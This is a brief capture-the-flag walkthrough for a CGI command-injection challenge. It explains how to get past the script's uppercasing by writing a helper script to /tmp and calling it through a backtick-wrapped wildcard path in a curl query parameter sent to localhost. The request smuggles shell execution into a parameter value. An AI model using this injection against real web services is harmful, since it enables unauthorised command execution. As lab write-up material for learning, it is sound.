# CGI Command‐Injection
## walk-through
- Passing script containing a command to the CGI program in order to get executed to receive the flag.

- By using the command `echo 'getflag > /tmp/flag' > /tmp/SCRIPT` as a parameter for the CGI script. Making the variable uppercase to match the program's pattern that does the same thing.

- Executing the command `curl localhost:4646/?x='`/*/SCRIPT`'`.

- Since '/tmp/SCRIPT' is translated to '/TMP/SCRIPT' by the CGI, Using the bash wildcard such as '/*/script' to find any occurences of the matching pattern. 